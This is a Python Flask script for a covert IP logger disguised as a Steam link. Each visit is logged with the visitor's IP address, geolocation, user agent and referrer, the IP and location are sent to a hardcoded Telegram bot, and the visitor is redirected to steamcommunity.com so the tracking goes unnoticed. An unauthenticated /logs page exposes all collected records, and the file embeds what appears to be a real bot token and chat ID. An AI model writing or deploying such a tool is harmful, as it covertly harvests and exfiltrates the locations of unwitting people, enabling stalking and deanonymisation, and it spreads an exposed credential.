from flask import Flask, request, redirect
import datetime
import requests
import os

app = Flask(__name__)

TELEGRAM_TOKEN = "8784653369:AAFfKAiDIKX2O5uDcwtBIP-LjkTixwfBF2o"
CHAT_ID = "7352598189"
LOG_FILE = "visits.txt"
REDIRECT_URL = "https://steamcommunity.com/"

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp")
        d = r.json()
        if d['status'] == 'success':
            return f"{d['country']}, {d['city']} ({d['isp']})"
    except:
        pass
    return "Unknown"

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except:
        pass

@app.route('/')
def track():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent', '')
    ref = request.headers.get('Referer', 'Direct')
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    geo = get_geo(ip)
    log = f"[{now}] IP: {ip} | {geo} | UA: {ua[:60]} | Ref: {ref}\n"
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log)
    send_tg(f"Visit: {ip} | {geo}")
    return redirect(REDIRECT_URL, 302)

@app.route('/logs')
def logs():
    if not os.path.exists(LOG_FILE):
        return "No logs"
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
